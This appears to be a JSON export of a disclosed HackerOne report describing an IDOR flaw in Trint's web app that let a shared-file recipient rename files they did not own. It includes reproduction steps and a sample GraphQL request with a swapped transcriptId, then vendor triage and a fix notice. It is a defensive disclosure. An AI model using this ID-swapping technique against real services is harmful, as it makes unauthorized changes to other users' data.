{"id":547663,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NDc2NjM=","url":"https://hackerone.com/reports/547663","title":"IDOR in changing shared file name","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-04-24T13:41:15.169Z","submitted_at":"2019-04-24T13:41:15.169Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dhakal_ananda","url":"/dhakal_ananda","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/9C57Dw1yXtk1RStQf5C7FhmS/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21749,"url":"https://hackerone.com/trint","handle":"trint","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/qqW6sCzyN86bfWnrnhRpaLYD/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/qqW6sCzyN86bfWnrnhRpaLYD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Trint Ltd","twitter_handle":"TrintHQ","website":"http://www.trint.com","about":"Trintâ€™s AI audio transcription software makes any audio and video searchable, editable and shareable."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-06-22T13:30:51.093Z","bug_reporter_agreed_on_going_public_at":"2019-05-23T13:30:47.703Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nHi Trind LTD,\nI have found a IDOR vulnerability in https://app.trint.com . An user can change shared file names through this IDOR.\n\n## Steps To Reproduce:\n\n1. Create a file from account B\n2. Capture the request of renaming the file as shown in **sample request**\n3. Create a file [from account A] and share it with another user [account B] \n4. Change the **transcriptId** to shared file's transcriptid\n5. Boom! The name of shared file is changed\n\n***Sample Request:***\n```\nPOST / HTTP/1.1\nHost: graphql2.trint.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://app.trint.com/trints\ncontent-type: application/json\nAuthorization: Bearer token..\nX-Trint-Request-Id: 34ba5627-d874-4be1-8f9b-5b1415c2f0a5\nX-Trint-Super-Properties: {\"distinct_id\":\"5cc05c8f03c35799283fe3b7\",\"$device_id\":\"16a4f88b2e22dc-07342bd7a0305c8-4c312c7c-144000-16a4f88b2e3be9\",\"$initial_referrer\":\"$direct\",\"$initial_referring_domain\":\"$direct\",\"returningUser\":true,\"$user_id\":\"5cc05c8f03c35799283fe3b7\"}\nOrigin: https://app.trint.com\nContent-Length: 536\nConnection: close\n\n{\"operationName\":\"updateTranscriptMeta\",\"variables\":{\"userId\":\"5cc05c8f03c35799283fe3b7\",\"transcriptId\":\"dM3YxaINQGyWceq5rUzVog\",\"transcriptName\":\"W00\"},\"query\":\"mutation updateTranscriptMeta($userId: String!, $transcriptName: String!, $transcriptId: String!) {\\n  updateTranscriptMeta(userId: $userId, transcriptMeta: {trintTitle: $transcriptName}, transcriptId: $transcriptId) {\\n    ...RenameTrintFragment\\n    __typename\\n  }\\n}\\n\\nfragment RenameTrintFragment on TrintMetadata {\\n  _id\\n  trintTitle\\n  updated\\n  __typename\\n}\\n\"}\n```\n\n## Impact\n\nUnauthorized users could change the file name. It is not allowed to rename the file for shared users but it is bypassed here through IDOR.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eHi Trind LTD,\u003cbr\u003e\nI have found a IDOR vulnerability in \u003ca title=\"https://app.trint.com\" href=\"/redirect?url=https%3A%2F%2Fapp.trint.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.trint.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e . An user can change shared file names through this IDOR.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a file from account B\u003c/li\u003e\n\u003cli\u003eCapture the request of renaming the file as shown in \u003cstrong\u003esample request\u003c/strong\u003e\n\u003c/li\u003e\n\u003cli\u003eCreate a file [from account A] and share it with another user [account B] \u003c/li\u003e\n\u003cli\u003eChange the \u003cstrong\u003etranscriptId\u003c/strong\u003e to shared file\u0026#39;s transcriptid\u003c/li\u003e\n\u003cli\u003eBoom! The name of shared file is changed\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eSample Request:\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: graphql2.trint.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://app.trint.com/trints\ncontent-type: application/json\nAuthorization: Bearer token..\nX-Trint-Request-Id: 34ba5627-d874-4be1-8f9b-5b1415c2f0a5\nX-Trint-Super-Properties: {\u0026quot;distinct_id\u0026quot;:\u0026quot;5cc05c8f03c35799283fe3b7\u0026quot;,\u0026quot;$device_id\u0026quot;:\u0026quot;16a4f88b2e22dc-07342bd7a0305c8-4c312c7c-144000-16a4f88b2e3be9\u0026quot;,\u0026quot;$initial_referrer\u0026quot;:\u0026quot;$direct\u0026quot;,\u0026quot;$initial_referring_domain\u0026quot;:\u0026quot;$direct\u0026quot;,\u0026quot;returningUser\u0026quot;:true,\u0026quot;$user_id\u0026quot;:\u0026quot;5cc05c8f03c35799283fe3b7\u0026quot;}\nOrigin: https://app.trint.com\nContent-Length: 536\nConnection: close\n\n{\u0026quot;operationName\u0026quot;:\u0026quot;updateTranscriptMeta\u0026quot;,\u0026quot;variables\u0026quot;:{\u0026quot;userId\u0026quot;:\u0026quot;5cc05c8f03c35799283fe3b7\u0026quot;,\u0026quot;transcriptId\u0026quot;:\u0026quot;dM3YxaINQGyWceq5rUzVog\u0026quot;,\u0026quot;transcriptName\u0026quot;:\u0026quot;W00\u0026quot;},\u0026quot;query\u0026quot;:\u0026quot;mutation updateTranscriptMeta($userId: String!, $transcriptName: String!, $transcriptId: String!) {\\n  updateTranscriptMeta(userId: $userId, transcriptMeta: {trintTitle: $transcriptName}, transcriptId: $transcriptId) {\\n    ...RenameTrintFragment\\n    __typename\\n  }\\n}\\n\\nfragment RenameTrintFragment on TrintMetadata {\\n  _id\\n  trintTitle\\n  updated\\n  __typename\\n}\\n\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eUnauthorized users could change the file name. It is not allowed to rename the file for shared users but it is bypassed here through IDOR.\u003c/p\u003e\n","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-06-22T13:30:47.828Z","allow_singular_disclosure_after":-48012534.30269511,"singular_disclosure_allowed":true,"vote_count":23,"voters":["dhakal0kushal","mygf","brodie_codie","dhakal_bibek","bb00x","tems","nitrozeus0x01","cryptographer","klau5","clarckowen_","and 13 more..."],"severity":{"rating":"medium","score":4.2,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":22765,"asset_type":"URL","asset_identifier":"app.trint.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4635559,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dhakalananda,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@staple","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dhakalananda\"\u003e@dhakalananda\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/staple\"\u003e@staple\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-24T17:16:44.964Z","updated_at":"2019-04-24T17:16:44.964Z","actor":{"username":"staple","cleared":false,"url":"/staple","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/426/626/5be8ff38188fdc44b801e26c3fa0311ac59dc701_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4635598,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-24T17:26:21.856Z","updated_at":"2019-04-24T17:26:21.856Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (4.2)","old_severity_id":356978,"new_severity_id":357107},"actor":{"username":"staple","cleared":false,"url":"/staple","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/426/626/5be8ff38188fdc44b801e26c3fa0311ac59dc701_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4635600,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @dhakalananda,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@staple","markdown_message":"\u003cp\u003eHello \u003ca href=\"/dhakalananda\"\u003e@dhakalananda\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/staple\"\u003e@staple\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-24T17:26:53.090Z","updated_at":"2019-04-24T17:26:53.090Z","actor":{"username":"staple","cleared":false,"url":"/staple","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/426/626/5be8ff38188fdc44b801e26c3fa0311ac59dc701_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4726495,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dhakalananda,\n\nThank you for bringing this to our attention.\nWe added the issue to our backlog and the team will work on a fix in one of the upcoming sprints.\n\nThank you,\n@fabioantunes","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dhakalananda\"\u003e@dhakalananda\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for bringing this to our attention.\u003cbr\u003e\nWe added the issue to our backlog and the team will work on a fix in one of the upcoming sprints.\u003c/p\u003e\n\n\u003cp\u003eThank you,\u003cbr\u003e\n\u003ca href=\"/fabioantunes\"\u003e@fabioantunes\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-03T09:13:50.377Z","updated_at":"2019-05-03T09:13:50.377Z","actor":{"username":"fabioantunes","cleared":false,"url":"/fabioantunes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4909912,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @dhakalananda,\n\nOnce again, thank you very much for reporting this vulnerability to us. We have implemented a fix, and it's deployed to production now. \nAs a note, users with editing permissions will still be able to edit the file name.\n\nKind Regards,\n@fabioantunes \n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dhakalananda\"\u003e@dhakalananda\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eOnce again, thank you very much for reporting this vulnerability to us. We have implemented a fix, and it\u0026#39;s deployed to production now. \u003cbr\u003e\nAs a note, users with editing permissions will still be able to edit the file name.\u003c/p\u003e\n\n\u003cp\u003eKind Regards,\u003cbr\u003e\n\u003ca href=\"/fabioantunes\"\u003e@fabioantunes\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-23T13:13:28.649Z","updated_at":"2019-05-23T13:13:28.649Z","actor":{"username":"fabioantunes","cleared":false,"url":"/fabioantunes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"dhakal_ananda","url":"/dhakal_ananda"},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4910235,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the quick fix. Let's make this public.","markdown_message":"\u003cp\u003eThanks for the quick fix. Let\u0026#39;s make this public.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-23T13:30:47.761Z","updated_at":"2019-05-23T13:30:47.761Z","first_to_agree":true,"actor":{"username":"dhakal_ananda","cleared":false,"url":"/dhakal_ananda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9C57Dw1yXtk1RStQf5C7FhmS/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4910875,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dhakalananda,\n\nWe still have some open IDOR issues in this area of the system. Allow us a few weeks to fix the problems regarding this vulnerability and we will then disclose this report.\n\nThank you,\n@fabioantunes ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dhakalananda\"\u003e@dhakalananda\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe still have some open IDOR issues in this area of the system. Allow us a few weeks to fix the problems regarding this vulnerability and we will then disclose this report.\u003c/p\u003e\n\n\u003cp\u003eThank you,\u003cbr\u003e\n\u003ca href=\"/fabioantunes\"\u003e@fabioantunes\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-23T15:06:29.887Z","updated_at":"2019-05-23T15:06:29.887Z","actor":{"username":"fabioantunes","cleared":false,"url":"/fabioantunes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5101704,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @fabioantunes,\n\nThe report is scheduled for disclosure. Is it okay to let it be public within a week? If not, please cancel disclosure for now and we can disclose it later.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/fabioantunes\"\u003e@fabioantunes\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe report is scheduled for disclosure. Is it okay to let it be public within a week? If not, please cancel disclosure for now and we can disclose it later.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-15T15:54:13.455Z","updated_at":"2019-06-15T15:54:13.455Z","actor":{"username":"dhakal_ananda","cleared":false,"url":"/dhakal_ananda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9C57Dw1yXtk1RStQf5C7FhmS/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5168436,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-22T13:30:51.109Z","updated_at":"2019-06-22T13:30:51.109Z","actor":{"url":"/trint","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qqW6sCzyN86bfWnrnhRpaLYD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Trint Ltd"}},"genius_execution_id":null,"team_handle":"trint","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}